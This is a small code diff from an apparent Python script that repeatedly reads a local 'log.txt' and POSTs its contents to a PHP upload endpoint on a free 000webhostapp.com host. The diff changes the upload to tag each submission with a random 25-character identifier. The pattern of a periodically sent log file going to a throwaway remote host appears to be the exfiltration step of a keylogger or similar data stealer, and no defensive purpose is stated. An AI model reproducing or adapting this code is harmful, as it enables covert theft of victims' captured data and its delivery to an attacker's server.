@@ -27,7 +27,7 @@ class xyz():
                     t.start()
                     time.sleep(10)
                     name = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(25))
-                    r = requests.post('https://filehandler-nqtm.000webhostapp.com/post-file.php', data={ 'x' : open('log.txt', 'rb').read() })
+                    r = requests.post('https://filehandler-nqtm.000webhostapp.com/post-file.php', data={ 'x' : "\n-------------------------\n"+name+"\n----------------------------\n"+open('log.txt', 'r').read() })
                     print(r.text)
                 send()
 
